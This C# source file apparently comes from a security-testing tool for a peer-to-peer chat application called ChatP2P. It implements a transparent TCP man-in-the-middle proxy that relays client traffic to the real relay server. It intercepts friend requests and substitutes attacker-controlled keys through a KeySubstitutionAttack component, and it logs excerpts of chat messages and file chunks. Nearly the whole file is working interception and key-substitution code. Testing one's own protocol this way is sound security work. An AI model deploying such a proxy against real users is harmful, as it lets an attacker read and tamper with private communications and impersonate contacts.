using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Linq;
using ChatP2P.SecurityTester.Models;
using ChatP2P.SecurityTester.Crypto;

namespace ChatP2P.SecurityTester.Network
{
    /// <summary>
    /// 🕷️ Proxy TCP transparent pour MITM réel - Interception et modification packets ChatP2P
    /// </summary>
    public class TCPProxy
    {
        private TcpListener? _proxyListener;
        private bool _isRunning = false;
        private readonly KeySubstitutionAttack _keyAttack;
        private CancellationTokenSource? _cancellationToken;

        public event Action<string>? LogMessage;
        public event Action<AttackResult>? PacketModified;

        public TCPProxy(KeySubstitutionAttack keyAttack)
        {
            _keyAttack = keyAttack;
        }

        /// <summary>
        /// 🚀 Démarre proxy TCP transparent sur port spécifique
        /// </summary>
        public async Task<bool> StartProxy(int listenPort, string targetHost, int targetPort)
        {
            try
            {
                // Obtenir IP locale pour logs et configuration
                var localIP = GetLocalIPAddress();

                _proxyListener = new TcpListener(IPAddress.Any, listenPort);
                _proxyListener.Start();
                _isRunning = true;
                _cancellationToken = new CancellationTokenSource();

                LogMessage?.Invoke($"🕷️ Proxy TCP démarré: {localIP}:{listenPort} → {targetHost}:{targetPort}");
                LogMessage?.Invoke($"🎯 MITM ACTIF: Client → [PROXY({localIP})] → Relay");

                // Accepter connexions entrantes de manière asynchrone
                _ = Task.Run(async () => await AcceptConnections(targetHost, targetPort, _cancellationToken.Token));

                return true;
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur démarrage proxy: {ex.Message}");
                return false;
            }
        }

        private async Task AcceptConnections(string targetHost, int targetPort, CancellationToken cancellationToken)
        {
            try
            {
                while (_isRunning && !cancellationToken.IsCancellationRequested)
                {
                    var clientSocket = await _proxyListener!.AcceptTcpClientAsync();
                    LogMessage?.Invoke($"📡 Nouvelle connexion interceptée: {clientSocket.Client.RemoteEndPoint}");

                    // Traiter chaque connexion en parallèle
                    _ = Task.Run(async () => await HandleConnection(clientSocket, targetHost, targetPort, cancellationToken));
                }
            }
            catch (Exception ex) when (!cancellationToken.IsCancellationRequested)
            {
                LogMessage?.Invoke($"❌ Erreur acceptation connexions: {ex.Message}");
            }
        }

        private async Task HandleConnection(TcpClient clientSocket, string targetHost, int targetPort, CancellationToken cancellationToken)
        {
            TcpClient? relaySocket = null;

            try
            {
                // Connexion vers le vrai relay server
                relaySocket = new TcpClient();
                await relaySocket.ConnectAsync(targetHost, targetPort);

                LogMessage?.Invoke($"🔄 Tunnel établi: Client ↔ [PROXY] ↔ {targetHost}:{targetPort}");

                var clientStream = clientSocket.GetStream();
                var relayStream = relaySocket.GetStream();

                // Relais bidirectionnel avec interception
                var task1 = RelayData(clientStream, relayStream, "Client→Relay", cancellationToken);
                var task2 = RelayData(relayStream, clientStream, "Relay→Client", cancellationToken);

                await Task.WhenAny(task1, task2);
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur tunnel: {ex.Message}");
            }
            finally
            {
                clientSocket?.Close();
                relaySocket?.Close();
                LogMessage?.Invoke("🔚 Tunnel fermé");
            }
        }

        private async Task RelayData(NetworkStream source, NetworkStream destination, string direction, CancellationToken cancellationToken)
        {
            try
            {
                var buffer = new byte[4096];

                while (!cancellationToken.IsCancellationRequested)
                {
                    int bytesRead = await source.ReadAsync(buffer, 0, buffer.Length, cancellationToken);
                    if (bytesRead == 0) break;

                    var data = new byte[bytesRead];
                    Array.Copy(buffer, data, bytesRead);

                    // 🕷️ INTERCEPTION ET MODIFICATION EN TEMPS RÉEL
                    var modifiedData = await InterceptAndModify(data, direction);

                    await destination.WriteAsync(modifiedData, 0, modifiedData.Length, cancellationToken);
                    await destination.FlushAsync(cancellationToken);
                }
            }
            catch (Exception ex) when (!cancellationToken.IsCancellationRequested)
            {
                LogMessage?.Invoke($"❌ Erreur relais {direction}: {ex.Message}");
            }
        }

        /// <summary>
        /// 🎯 Intercepte et modifie les packets ChatP2P en temps réel
        /// </summary>
        private async Task<byte[]> InterceptAndModify(byte[] data, string direction)
        {
            try
            {
                var content = Encoding.UTF8.GetString(data);

                // 🔍 Détecter friend requests
                if (content.Contains("FRIEND_REQ") && direction == "Client→Relay")
                {
                    LogMessage?.Invoke($"🎯 FRIEND REQUEST INTERCEPTÉE!");
                    LogMessage?.Invoke($"   Direction: {direction}");
                    LogMessage?.Invoke($"   Contenu: {content.Substring(0, Math.Min(100, content.Length))}...");

                    // 🕷️ SUBSTITUTION CLÉS EN TEMPS RÉEL
                    var attackResult = await _keyAttack.AttemptFriendRequestSubstitution(content);

                    if (attackResult.Success && !string.IsNullOrEmpty(attackResult.Details))
                    {
                        LogMessage?.Invoke("✅ SUBSTITUTION RÉUSSIE - Clés attaquant injectées!");

                        PacketModified?.Invoke(new AttackResult
                        {
                            Success = true,
                            AttackType = "REAL_TIME_KEY_SUBSTITUTION",
                            Description = "Friend request modifiée en temps réel",
                            Details = $"Original: {content.Length} bytes → Modifié: {attackResult.Details.Length} bytes"
                        });

                        return Encoding.UTF8.GetBytes(attackResult.Details);
                    }
                }

                // 🔍 Logger autres trafics intéressants
                if (content.Contains("CHAT_MSG") || content.Contains("FILE_CHUNK"))
                {
                    LogMessage?.Invoke($"📨 Trafic ChatP2P: {direction} - {content.Substring(0, Math.Min(50, content.Length))}...");
                }

                return data; // Pas de modification
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur modification packet: {ex.Message}");
                return data; // Retourner données originales en cas d'erreur
            }
        }

        public void StopProxy()
        {
            try
            {
                _isRunning = false;
                _cancellationToken?.Cancel();
                _proxyListener?.Stop();

                LogMessage?.Invoke("⏹️ Proxy TCP arrêté");
            }
            catch (Exception ex)
            {
                LogMessage?.Invoke($"❌ Erreur arrêt proxy: {ex.Message}");
            }
        }

        public bool IsRunning => _isRunning;

        private string GetLocalIPAddress()
        {
            try
            {
                // Obtenir l'IP locale réelle (pas localhost)
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                var localIP = host.AddressList
                    .Where(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    .Where(ip => !System.Net.IPAddress.IsLoopback(ip))
                    .FirstOrDefault();

                return localIP?.ToString() ?? "localhost";
            }
            catch
            {
                return "localhost";
            }
        }
    }
}